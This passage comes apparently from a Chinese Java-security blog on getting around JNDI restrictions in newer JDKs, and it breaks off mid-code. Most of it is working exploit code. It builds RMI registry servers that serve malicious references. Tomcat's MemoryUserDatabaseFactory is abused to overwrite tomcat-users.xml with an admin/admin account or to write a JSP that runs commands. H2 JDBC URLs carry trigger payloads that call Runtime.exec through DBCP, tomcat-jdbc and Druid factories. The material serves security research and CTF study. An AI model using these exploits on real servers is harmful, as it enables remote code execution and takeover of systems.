LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ldapbypass.exp());</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>xml:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-script&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-jmx&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-status&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;admin-script&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">password</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在conf目录的那一级开python临时http服务器</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401162644.png" alt="image.png"><br>我这里环境出了点状况没复现成功</p>
<p>Linux下需要先创建那两个目录,再执行xml覆盖,这里创建目录用的<code>org.h2.store.fs.FileUtils的createDirectory</code>方法:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcatMkdirFrist</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=createDirectory&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;../http:&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcatMkdirLast</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=createDirectory&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;../http:/127.0.0.1:8888&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcatManagerAdd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/../../conf/tomcat-users.xml&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;false&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终覆盖xml文件可以直接去/manager路由登录管理员</p>
<h4 id="执行jsp"><a href="#执行jsp" class="headerlink" title="执行jsp"></a>执行jsp</h4><p>写个jsp<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;<span class="symbol">&amp;#x3c;</span>%Runtime.getRuntime().exec(<span class="symbol">&amp;#x22;</span>calc.exe<span class="symbol">&amp;#x22;</span>); %<span class="symbol">&amp;#x3e;</span>&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>存在webapps/ROOT/test.jsp<br>在webapps开启临时服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">exp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;false&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401163721.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></li>
<li><a href="https://www.viewofthai.link/2023/01/12/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8Bjndi%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%8A%EF%BC%89/">https://www.viewofthai.link/2023/01/12/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8Bjndi%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%8A%EF%BC%89/</a></li>
<li><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></li>
<li><a href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI绕过高版本jdk限制2-JDBC</title>
    <url>/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%872-JDBC/</url>
    <content><![CDATA[<h3 id="dbcp"><a href="#dbcp" class="headerlink" title="dbcp"></a>dbcp</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">dbcpByFactory</span><span class="params">(String factory)</span>&#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;root&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">commons_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">commons_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ldapbypass.tomcat_dbcp2_RCE());</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有四个dbcp的,上面代码用的tomcat的,复现的时候需要给项目加依赖,我加的是本地tomcat安装目录的bin和lib目录的依赖<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401210652.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401210727.png" alt="image.png"></p>
<p>换成org.apache.commons.dbcp.BasicDataSourceFactory的需要加依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401210908.png" alt="image.png"></p>
<p>如果没有上面的四个dbcp的依赖,还有tomcat的 tomcat-jdbc.jar 的 <code>org.apache.tomcat.jdbc.pool.DataSourceFactory</code><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_JDBC_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">dbcpByFactory</span><span class="params">(String factory)</span>&#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;root&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;password&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401211253.png" alt="image.png"></p>
<h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><p>主要参考: <a href="https://xz.aliyun.com/t/10656">https://xz.aliyun.com/t/10656</a><br>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.197<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>原理也是本地classpath,这里用的DruidDataSourceFactory的getObjectIntance方法调用h2数据库来JDBC攻击进而RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;cmd /c calc.exe&#x27;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">JDBC_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,JDBC_USER));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,JDBC_PASSWORD));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;init&quot;</span>,<span class="string">&quot;true&quot;</span>));</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line"></span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>开始调试:<br>断点下在一个lookup一个DruidDataSourceFactory的getObjectIntance()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203014.png" alt="image.png"><br>首先判断一下ref.getClassName()的值进到else语句,先通过for循环遍历所有属性把我们设置的四个值传进properties变量,然后进入createDataSourceInternal()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203315.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203331.png" alt="image.png"><br>新建一个DruidDataSource()对象,为它调用config()函数<br>config函数首先会调用很长的get函数获取属性值然后调用dataSource的setter来赋值<br>我们直接看到最后:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203541.png" alt="image.png"><br>我们传入的init是true进入init()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203654.png" alt="image.png"><br>然后进入createPhysicalConnection()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203839.png" alt="image.png"><br>然后走到this.createPhysicalConnection(url, physicalConnectProperties);<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401203926.png" alt="image.png"><br>这里connect建立数据库连接,然后RCE<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401204217.png" alt="image.png"><br>弹出计算器</p>
<h3 id="第二届N1CTF-Junior的Derby"><a href="#第二届N1CTF-Junior的Derby" class="headerlink" title="第二届N1CTF Junior的Derby"></a>第二届N1CTF Junior的Derby</h3><p>这里最后的RCE是考h2的数据库JDBC来RCE的,我们不局限于h2这一种数据库,比如derby数据库,这里可以参考第二届N1CTF Junior的Derby<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>关于Derby的RCE: <a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</a><br>我们可以发现通过 Derby SQL 加载远程 jar, 再调用 jar 内的方法, 实现 RCE<br>执行sql的点在 DruidDataSourceFactory的initConnectionSqls变量里,我们用分号分割多条sql语句,然后利用ldap直接把序列化的字符串返回给客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span 